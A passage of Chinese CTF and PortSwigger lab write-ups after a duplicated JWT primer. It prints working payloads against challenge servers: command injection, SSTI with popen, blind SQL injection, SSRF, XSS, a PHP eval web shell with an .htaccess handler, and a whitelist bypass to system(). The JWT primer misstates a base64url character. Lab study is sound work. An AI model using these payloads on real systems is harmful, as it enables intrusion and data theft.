JWT的全称是JSON Web Token。遵循JSON格式，跨域认证解决方案。声明被存储在客户端，而不是服务器内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法

jwt由三部分组成：header、payload、signature

### header

header部分最常用的两个字段是alg和typ，alg指定了token加密使用的算法（最常用的为HMAC'和RSA算法），typ声明类型为JWT

### payload

payload则为用户数据以及一些元数据有关的声明，用以声明权限。

### signature

signature的功能是保护token完整性；生成方式是将header和payload两个部分链接，然后通过header部分指定的算法，计算签名

抽象成公式就是

```
signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key
```

`注意：`编码header和payload时使用的编码方式为`base64urlencode`，`base64url`编码是`base64`的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。

JWT中最常用的两种算法为HMAC和RSA

HMAC是密钥相关的哈希运算消息认证码的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密

RSA则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。



JWT的全称是JSON Web Token。遵循JSON格式，跨域认证解决方案。声明被存储在客户端，而不是服务器内存中。服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法

jwt由三部分组成：header、payload、signature

### header

header部分最常用的两个字段是alg和typ，alg指定了token加密使用的算法（最常用的为HMAC'和RSA算法），typ声明类型为JWT

### payload

payload则为用户数据以及一些元数据有关的声明，用以声明权限。

### signature

signature的功能是保护token完整性；生成方式是将header和payload两个部分链接，然后通过header部分指定的算法，计算签名

抽象成公式就是

```
signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key
```

`注意：`编码header和payload时使用的编码方式为`base64urlencode`，`base64url`编码是`base64`的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。

JWT中最常用的两种算法为HMAC和RSA

HMAC是密钥相关的哈希运算消息认证码的缩写，它是一种对称加密算法，使用相同的密钥对传输信息进行加解密

RSA则是一种非对称加密算法，使用私钥加密明文，公钥解密密文。





# write-up
The author is lazy and this respository aims to push me


凯撒密码罢了：

大概就是设置一个密钥i

然后每个字母的大概为平移i为（注意在小写字母中或者在大写字母中平移）

可以直接穷举：python脚本如下

```python
decoded_words = 'kimaizqaktiaaqkkqxpmz'
flag = []
for i in range(27):
    current_flag = ''
    for s in decoded_words:
        ascii_code = ord(s)-97
        ascii_code = (ascii_code-i) % 26 + 97
        current_flag += chr(ascii_code)
    flag.append(current_flag)
    print(current_flag)
```

然后发现目标单词：caesarisclassiccipher

即可提交flag

直接简单的替换（移位密码一键解决）

http://quipqiup.com/

第一部分藏在属性中（可以直接用strings或者查看）即可找到

然后发现最后有一串字符以=结尾，预知为base家族

试了下base32获得password，即可改后缀为zip，用密码解压即可获得第二部分

开始在官网鼓捣了一会没有发现什么有用的信息(hhh)

然后开始翻html、css、js源码(好多好长)

然后在0ops_cli_all.js中发现了有用信息(虽然js脚本不怎么看得懂、但是可以大致猜到意思的)

然后发现了几个关键点

![](./assets/upload_f56e7dccd5db30eff56a7c8160ad343f.png)

这里的意思是读取.flag这个文件的时候会有以下输出(后面发现在sudo ls 命令下也可以查到.flag的文件)

然后又发现一个比较关键的东西hint

![](./assets/upload_3080da3b3c910e8e4bcfedaf3851fd7c.png)

在官网输入hint会显示

![](./assets/upload_f29542aa7ff000cbc4b33ecb3e541e41.png)

这里还不是对konami很了解(问就是游戏王、魂斗罗这些游戏玩少了)

然后搜了一下konami的大致信息后来又看js代码

![](./assets/upload_6eaf0a5b61b8300e5905f9c137b9d0b7.png)

发现有一个konami.count和ba发现好奇怪，后面搜索konami的特殊代码后面知晓要输入一个特殊代码

就是
$$
\uparrow \uparrow \downarrow\downarrow\leftarrow\rightarrow\leftarrow\rightarrow ba
$$
输入页面会有变化，最后输入四次后会出现如下

![](./assets/upload_3dd6a8efd290cde9404d92b6ee0b5d1c.png)

然后得到一串base64编码后的字符就很痛苦不知道怎么解码

用网站解码发现格式错误好多(还是要多用python本身解码)

```python
import zlib
import base64

base64_str = 'emxpYi5kZWNvbXByZXNzKCd4nLPTpgrQsyFdi50uBtDDpg63ndiMwAVwGoPFYEzNNrp6dpjOwVQIVU6WC3CZBtcPAIrcScYnKQ=='
raw_data = base64.b64decode(base64_str)
encode_flag=b'x\x9c\xb3\xd3\xa6\n\xd0\xb3!]\x8b\x9d.\x06\xd0\xc3\xa6\x0e\xb7\x9d\xd8\x8c\xc0\x05p\x1a\x83\xc5`L\xcd6\xbazv\x98\xce\xc1T\x08UN\x96\x0bp\x99\x06\xd7\x0f\x00\x8a\xdcI\xc6'
flag=zlib.decompress(encode_flag)
print(flag)
```

解码后得到如下

b'>++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++.<+++++++++++++++++++++++++++++++++++++++++++++++++.>------------------.+++++++++++++++++++.++++++++++++++++++++++++.<.>------------------------------------------.++++++++++++++++++++++++++++++++++++++++++.-----------------.<-.>++++++.+++++++++++.-----------------------.---------------------.+++++++++++++++++++++++++++++++.-------------------------------.'

一眼brainfuck

解码后得到flag

大概就是先修改cookie：admin=1

然后发post包：flag=0ops

然后用bp看回显（即可看到flag）

先用grep -ra "0ops*" 发现没有输出值，感觉grep这个指令可能被屏蔽了（要不太简单了）

后面又用find \ -name "flag*"发现返回一堆设备文件的flag（可能是输出行数有限制？，把关键的东西给删了？）

然后去搜索文件 ？ip=1 |  ls ../../..

输出以下目录：bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var

发现flag文件夹，然后输入？ip=1 | ls ../../../flag 发现文件80e20712e0fccd9dc5d6c1f7932efc57

在输入ip=1 | cat ../../../flag/80e20712e0fccd9dc5d6c1f7932efc57即可

查看flag

普通的绕过

用hackbar可以轻松获取flag

http://web1.0ops.sjtu.cn:40016/?ip=192.1.1.2${IFS}|${IFS}cat${IFS}../../../flag/e901a1c04ef6a6179219bd06ff8a944c

感觉一定的积累到了，就很厚积薄发

先看源代码发现第一部分

然后查看响应第二部分

![image-20230827150850313](./assets/image-20230827150850313.png)

然后在cookie中找到第三部分

后来发现在BurpSuite上查看响应就可以看到第二部分和第三部分了（哦不对，直接看到三部分了）

![image-20230827151050827](./assets/image-20230827151050827.png)

http://web1.0ops.sjtu.cn:40024/?path=php://filter/read=convert.base64-encode/resource=first_flag.php

base64解码就可以了

这里补充一个知识

include原来是执行那个php文件

是的，`include` 函数用于在 PHP 脚本中执行另一个文件中的 PHP 代码。它将指定文件的内容包含到当前的 PHP 脚本中，并按顺序执行其中的代码。这样可以将代码模块化，将多个文件组合在一起，实现代码的重用和分离。

当 `include` 函数执行时，它会将指定文件的内容视为 PHP 代码，并在当前的执行环境中解析和执行该代码。可以认为 `include` 是将目标文件的内容复制粘贴到调用 `include` 的位置，然后继续执行。

如果被包含的文件中存在函数、类、变量等声明，它们可以在包含文件后在当前脚本中使用。这使得 `include` 函数非常有用，可以将代码逻辑分解到不同的文件中，提高代码的可维护性和可读性。

需要注意的是，`include` 函数在执行过程中会进行文件的查找和读取操作，因此要确保被包含的文件存在并且具有适当的权限。同时，与用户输入相关的文件路径应进行充分验证和过滤，以防止安全漏洞。

妈的，原来传递序列化对象的时候真的可以把引用传递过去

```php
<?php 
class unserialize1 {
    var $input;
    var $secret;
    function unserialize1()
    {
    $this->input=&$this->secret;
    }
    }
echo serialize(new unserialize1());
?>
```

输出这个O:12:"unserialize1":2:{s:5:"input";N;s:6:"secret";R:2;}**这里面的R2代表引用**

不加这个引用的话

```
O:12:"unserialize1":2:{s:5:"input";N;s:6:"secret";N;}
```

这题还挺有意思的

```php
<?php

require 'flag.php';

mt_srand(time());

if (intval($_GET['r1']) === mt_rand(0, 1 << 6) &&
  intval($_GET['r2']) === mt_rand(1 << 6, 1 << 12) &&
  intval($_GET['r3']) === mt_rand(1 << 12, 1 << 18) &&
  intval($_GET['r4']) === mt_rand(1 << 18, 1 << 24) &&
  intval($_GET['r5']) === mt_rand()) {
  echo $flag;
}

show_source(__FILE__);
```



大概就是用time()当种子产生随机数，手动实现time（）就行了，好一个伪随机数

payload

```php
<?php
mt_srand(time()+5);
$r1=mt_rand(0, 1 << 6);
$r2=mt_rand(1 << 6, 1 << 12);
$r3=mt_rand(1 << 12, 1 << 18);
$r4= mt_rand(1 << 18, 1 << 24);
$r5=mt_rand();
echo("http://web1.0ops.sjtu.cn:40036/rand1/index.php?".
"r1=".$r1."&r2=".$r2."&r3=".$r3."&r4=".$r4."&r5=".$r5);
```



源码如下

```php
<?php

error_reporting(0); 

require 'flag.php';

$str = $_GET['O_O'] ?? false;

if(!$str) {
  highlight_file(__FILE__);
  die();
}

if (stristr($_SERVER['QUERY_STRING'], "O_O") !== false) {
  die();
}

if ($str < 0xffffffff) {
  die();
} 

if ((string)$str > 0) {
  die();
}

echo $flag;
```

ps:跟2018“安恒杯”WEB安全测试秋季资格赛的题目真像（合理怀疑抄袭）

首先需要生成一个GET请求并且参数为O_O,但是第二个判断要求GET请求的参数不能为O_O,PHP的特性会把.替换为_

然后后面两个判断也要满足，可以使$str为一个数组，由于类型不同无法判断，所以一定会不成立

原来两个sha一样的东西真的存在

?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1

原来两个sha一样的东西真的存在

?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1



直接在 md5() 函数传入数组时会报错返回 NULL，当 2 个变量都导致报错返回 NULL 时就能使使得条件成立。构造出 payload 提交：

http://web1.0ops.sjtu.cn:40004/ezhash/index.php?user[]=1&pass[]=0

感觉0ops上的ssti好简单啊

```php
POST /show HTTP/1.1
Host: web1.0ops.sjtu.cn:40022
Content-Length: 124
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://web1.0ops.sjtu.cn:40022
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web1.0ops.sjtu.cn:40022/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=eyJyb2xlIjoidXNlciJ9.ZPMrww.bmaymKDfqi80d1pwY4HhC6u9T4k
Connection: close

username=%7b%7b().__class__.__mro__%5b1%5d.__subclasses__()%5b117%5d.__init__.__globals__.popen('cat%20app.py').read()%7d%7d
```



打开发现没有提交界面，只有一个index.php的界面（开始很懵逼不知道怎么提交），然后发现可以手撕一个前端的提交界面。提交界面如下：

```html
<!DOCTYPE html>
<html>
<body>

<form action="http://web1.0ops.sjtu.cn:40010/file/index.php" method="post" enctype="multipart/form-data">
    <input type="file" name="file"><br>
    <input type="submit" value="上传文件">
</form>

</body>
</html>
```

提交后发现用蚁剑连接后没有权限（disable中禁用了好多函数），然后一直在想办法绕过（绕不了一点），后来发现可以用类似命令行注入的方式来获取相应的文件名

先查找所有目录下的文件名：

```php
<?php
// 读取文件内容
$file_path = '/';
$file_content = file_get_contents($file_path);

// 输出文件内容
echo $file_content;
?>
```

报错 file_get_contents(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html/file/:/var/www/html/upload/:/flag/:/tmp/) in **/var/www/html/upload/2.php** on line **4**

只能查找四个目录下的文件，然后即可找到/flag下的文件，打开即为相应的flag

BurpSuite的lab质量真的挺不错，顺带还有YouTube的视频可以教我BP的功能，目前感觉BP应该会陪伴自己很长的一段时间

SQL注入也可以配合SQLmap开扫，虽然工具的效果一般还慢

注入点在登录的界面，登录界面bp抓包注意到有一个cookie

```shell
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--;
```

然后这里是cookie注入，至于为什么是POSTGRESQL，我也不知道呀

然后尝试注入点

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--

```

发现有延时，于是确定注入

然后开始逐步确定

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--

```

开始确定密码的位数

```sql
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

然后即可用bp爆破获得密码（这里也可以用python),竟然还看到用shell脚本的一位勇士

然后即可注出结果

感觉对SSRF攻击的理解有点问题，这次好好纠正一下

服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。

指的是通过伪造网址为127.0.0.1或者localhost来伪造自己是一个内网环境中，故不用再进行认证

这篇文章讲的太好了：

https://portswigger.net/web-security/ssrf#what-is-the-impact-of-ssrf-attacks

这道题直接在check stock里面抓包修改为

http://localhost/admin/delete?username=carlos

即可

下次用英文搜索，英文的资料会好很多

#### DOM型

- CTF比赛中出现的场景：动态执行JavaScript语句，更改dom树结构

This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.

To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that calls the `alert` function.

构造这个即可

```html
<img src=1 onerror=alert(1)>
```



不得不说一分题目还是挺简单的，下次做就熟悉了

好有意思的名字，对用户的过度信任，开始的时候一直抓包然后没找到price，谁知道是在将商品加入用户车的时候有一个price的泄露，一直以为是在购买的时候有一个price

将商品加入cart的数据包

```POST /cart HTTP/2
Host: 0a25002a03eeb5ea82724273007b008f.web-security-academy.net
Cookie: session=yxduTIAcJM9G8bF3GL0mxMNl6cEKp8jH
Content-Length: 49
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a25002a03eeb5ea82724273007b008f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a25002a03eeb5ea82724273007b008f.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

productId=1&redir=PRODUCT&quantity=1&price=133700
```

将这里的price改一下即可

这里是用host来认证是否为内网

先用dirsearch 扫一下

![image-20240125095624194](./assets/image-20240125095624194.png)

扫到admin

然后进去admin

![image-20240125095645225](./assets/image-20240125095645225.png)

发现没有权限，然后这里是用host来进行认证的，于是修改host为localhost而不是127.0.0.1这里的一个区别如下

```
127.0.0.1 is normally the IP address assigned to the "loopback" or local-only interface. This is a "fake" network adapter that can only communicate within the same host. It's often used when you want a network-capable application to only serve clients on the same host. A process that is listening on 127.0.0.1 for connections will only receive local connections on that socket.

"localhost" is normally the hostname for the 127.0.0.1 IP address. It's usually set in /etc/hosts (or the Windows equivalent named "hosts" usually at C:\Windows\System32\Drivers\etc\hosts). You can use it just like any other hostname - try ping localhost to see how it resolves to 127.0.0.1.

0.0.0.0 has a couple of different meanings, but in this context, when a server is told to listen on 0.0.0.0 that means "listen on every available network interface". The loopback adapter with IP address 127.0.0.1 from the perspective of the server process looks just like any other network adapter on the machine, so a server told to listen on 0.0.0.0 will accept connections on that interface too.

That hopefully answers the IP side of your question. I'm not familiar with Jekyll or Vagrant, but I'm guessing that your port forwarding 8080 => 4000 is somehow bound to a particular network adapter, so it isn't in the path when you connect locally to 127.0.0.1
```



下次看一下lab description然后再去看WP，别那么喜欢看WP然后丧失了自己思考的能力（虽然题都很难)

然后这个Insecure direct object references (IDOR)

主要的意思就是有一部分权限没有控制好，相当于给了多余的权限

把这个改成1.txt即可获得答案

![image-20240101220819198](./assets/image-20240101220819198.png)

一道SSRF题目，让我对SSRF攻击有了更深的理解，

感觉ssrf就是绕过外面的限制，直接走内部请求来获取信息

发现在stock的页面中有一个奇怪的请求

```
POST /product/stock HTTP/2
Host: 0a76004a032a5060807658cc009400c1.web-security-academy.net
Cookie: session=9bwUTzb5deghei87BHnSZR52ndQTaJAg
Content-Length: 107
Sec-Ch-Ua: 
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a76004a032a5060807658cc009400c1.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a76004a032a5060807658cc009400c1.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
```

这里请求了stockApi来获取信息，

我们伪造一个127.0.0.1/admin来实现内网的请求从而获取权限

但是过滤了.0和admin

127.0.0.1==127.1可以绕过一层过滤

admin可以采用双重url编码的方式绕过

```
在 SQL 注入攻击中，双层 URL 编码绕过机制是一种黑客利用 URL 编码的漏洞绕过安全检查的手法。原始的 URL 编码是将特殊字符转换成 % 后面跟着它的 ASCII 值的十六进制表示。例如，' 被编码为 %27，" 被编码为 %22。

然而，某些 Web 应用程序在接收到 URL 编码值时，会自动对它进行解码，然后再进行一次处理。这意味着攻击者可以使用双层 URL 编码来绕过输入过滤和验证机制。

攻击者可以首先将攻击字符串进行一次 URL 编码，然后将编码后的值再次进行 URL 编码。这样，第一层的编码将被解码，然后第二层的编码也将被解码。这样做的目的是让关键的特殊字符在第二次解码时恢复成原始状态。
```

主要是某些Web会自动解码，感觉全靠尝试

然后即可构造payload

```
stockApi=http://127.1/%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65
```

然后实现了越权

https://0a3f00a604abaa4181ca93b8002800b8.web-security-academy.net/my-account?id=wiener

感觉巨简单的题，将wiener改为carols即可

直接D盾开扫

然后就可以找到密码

![image-20231231232608826](./assets/image-20231231232608826.png)

给了一个config.bin文件，然后google 宽带 + config.bin即可了解到一个新工具RouterPassView。大多数现代路由器都可以让您备份一个文件路由器的配置文件，该软件可以读取这个路由配置文件。联系题目，conf.bin文件可能为一个路由器的配置文件。我们用RouterPassView打开conf.bin文件，将username套进flag即可

原来Real就是演示vulhub里面的靶机啊，无趣（不如Web)

直接扫到lxml的版本为2.8 知道为xxe即可直接构建exp

随便提交然后发现响应标头里面有hint

![image-20230912184537660](./assets/image-20230912184537660.png)

然后发现password=md5($pass,true)这里其实想了一下传进去的参数是password还是pass

其实前面应该是有一句话的

```php
$pass=$_GET('password')
```

然后发现

```php
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
```

这里32位的16进制的字符串，两个一组就是上面的16位二进制的字符串。比如27，这是16进制的，先要转化为10进制的，就是39，39在ASC码表里面就是’    '    ‘字符。6f就是对应‘    o    ’。

       然后我们得到的sql语句就是 SELECT * FROM admin WHERE username = 'admin' and password = ''or'6�]��!r,��b'
    
       为什么password = ''or'6�]��!r,��b'的返回值会是true呢，因为or后面的单引号里面的字符串（6�]��!r,��b），是数字开头的。当然不能以0开头。（我不知道在数据库里面查询的时候，�这种会不会显示）
    
       这里引用一篇文章，连接在下面，里面的原话“a string starting with a 1 is cast as an integer when used as a boolean.“
    
      在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1  ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。
    
       当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）


自己好喜欢鸽wp啊，这是一道表面上的"math"题

```php
<?php
error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

这里主要是构建一个类似这种的

```
c=system("cat /flag") //flag目录结合具体题目
```

1.绕过函数和引号的限制，引号可以删掉，然后函数是可以利用动态函数的性质，即字符串做函数名，加上括号即可被当作函数执行：

```c=($_GET[a])($_GET[b])
c=($_GET[a])($_GET[b])
```

所以目标的payload如下：

```
c=($_GET[a])($_GET[b])&a=system&b=cat /flag
```

白名单用来检测c中出现的变量名，因此a，b不能出现，但是可以用白名单中的值，比如abs，cos。GET中括号和和GET本身都不能出现，中括号可以用{}替代，因此这道题的核心就是构造_GET。构造如下：

```
base_convert(37907361743,10,36)(dechex(1598506324))
```

base_convert(37907361743,10,36)=>"hex2bin"，dechex(1598506324)=>"5f474554",hex2bin("5f474554")=>_GET

最后的payload

```
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos})&pi=system&cos=cat /flag
```

这里用$pi作为_GET传参

这里将一个绕过

```php
 preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
```

这里是讲对于所有ascii码内的字符进行匹配，上述payload匹配出来为pi base_convert dechex pi pi pi cos

感觉关键点就是构造_GET,然后绕过，不过对于一种新的传参方式c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){cos}) 有了新的认识

## php动态函数调用方法

------

php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数

很有意思的一道流量加密题目

先搜索 tcp contains "key"然后发现一段base64加密的数据包

然后base64 + render获得图片

![image-20240229201957588](C:/Users/86186/AppData/Roaming/Typora/typora-user-images/image-20240229201957588.png)

然后即可ocr校对一下然后输入私钥即可解密出http数据流

好简单的一道题

构造

![image-20231231134437730](./assets/image-20231231134437730.png)

即可成功

是一个htaccess的漏洞（吐槽：怎么有不让扫目录的）

先上传1.jpg

<?php @eval($_POST['shell']);?>

然后再上传.htaccess，设置对于1.jpg 用php的形式执行

<FilesMatch "1.jpg">

SetHandler application/x-httpd-php

</FilesMatch>

.htaccess文件(或者"分布式配置文件"）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。

概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。

笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。
然后用蚁剑即可链接



感觉算是比较简单的一道题了，但是自己太困了就懒得动脑子了，还是在给自己找借口

help处发现任意文件下载

